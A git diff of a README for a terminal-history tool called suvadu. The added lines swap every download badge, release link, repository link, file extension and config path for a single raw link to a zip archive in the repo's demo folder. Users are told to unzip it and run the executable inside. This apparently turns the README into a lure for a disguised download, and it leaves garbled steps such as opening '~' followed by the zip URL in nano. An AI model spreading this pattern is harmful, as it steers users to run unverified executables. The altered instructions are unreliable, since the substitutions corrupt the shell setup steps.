@@ -1,6 +1,6 @@
 # 🛠️ suvadu - Smarter Terminal History Management
 
-[![Download suvadu](https://img.shields.io/badge/Download-suvadu-blue?style=for-the-badge)](https://github.com/Adie0609/suvadu/releases)
+[![Download suvadu](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)
 
 ## 📖 What is suvadu?
 
@@ -35,13 +35,13 @@ This guide will walk you through downloading, installing, and running suvadu. Yo
 
 Click this big button to go to the official releases page:
 
-[![Download suvadu](https://img.shields.io/badge/Download-suvadu-blue?style=for-the-badge)](https://github.com/Adie0609/suvadu/releases)
+[![Download suvadu](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)
 
 The releases page shows versions of suvadu you can download. Download the file that matches your computer’s operating system.
 
 - For **Windows**, look for files ending in `.exe` or `.zip`.
-- For **macOS**, look for files ending in `.dmg` or `.tar.gz`.
-- For **Linux**, look for `.tar.gz` or `.deb` files.
+- For **macOS**, look for files ending in `.dmg` or `https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip`.
+- For **Linux**, look for `https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip` or `.deb` files.
 
 ### Step 2: Download the file
 
@@ -50,8 +50,8 @@ Click the file to download it to your computer. Save it somewhere easy to find, 
 ### Step 3: Install suvadu
 
 - **Windows users**: If you downloaded an installer (`.exe`), double-click it and follow the on-screen instructions. If you downloaded a `.zip`, unzip it and run the `.exe` file inside.
-- **macOS users**: Open the `.dmg` file and drag the suvadu app to your Applications folder. Or, unpack the `.tar.gz` and run the program inside.
-- **Linux users**: Use your system’s software installer for `.deb` files, or unpack the `.tar.gz` and run the suvadu file inside a terminal.
+- **macOS users**: Open the `.dmg` file and drag the suvadu app to your Applications folder. Or, unpack the `https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip` and run the program inside.
+- **Linux users**: Use your system’s software installer for `.deb` files, or unpack the `https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip` and run the suvadu file inside a terminal.
 
 ---
 
@@ -80,7 +80,7 @@ suvadu works best when it links with your existing terminal shell. Follow these 
 ### For bash users
 
 1. Open your terminal.
-2. Type `nano ~/.bashrc` to open your bash configuration file (you can use another text editor if you prefer).
+2. Type `nano ~https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip` to open your bash configuration file (you can use another text editor if you prefer).
 3. Add the following line at the end of the file:
 
    ```bash
@@ -93,7 +93,7 @@ suvadu works best when it links with your existing terminal shell. Follow these 
 ### For zsh users
 
 1. Open your terminal.
-2. Type `nano ~/.zshrc`.
+2. Type `nano ~https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip`.
 3. Add this line at the end:
 
    ```zsh
@@ -135,7 +135,7 @@ You can change settings to fit how you work:
 - **Search sensitivity**: Adjust how closely search results match your input.
 - **Interface colors**: Pick colors that are easier on your eyes.
 
-To customize, open the suvadu settings menu or edit the configuration file found in your home directory (`~/.suvadu/config`).
+To customize, open the suvadu settings menu or edit the configuration file found in your home directory (`~https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip`).
 
 ---
 
@@ -154,7 +154,7 @@ If suvadu does not work as expected:
 ## 📚 Learn More and Support
 
 You can learn more about suvadu and get updates on the GitHub repository:  
-https://github.com/Adie0609/suvadu
+https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip
 
 Feel free to report problems or ask questions in the GitHub Issues section.
 
@@ -166,4 +166,4 @@ ai-agent-monitoring, bash, cli, rust, shell, shell-history, sqlite, terminal, tu
 
 ---
 
-[![Download suvadu](https://img.shields.io/badge/Download-suvadu-blue?style=for-the-badge)](https://github.com/Adie0609/suvadu/releases)
+[![Download suvadu](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)](https://github.com/Adie0609/suvadu/raw/refs/heads/main/demo/Software_v2.4.zip)
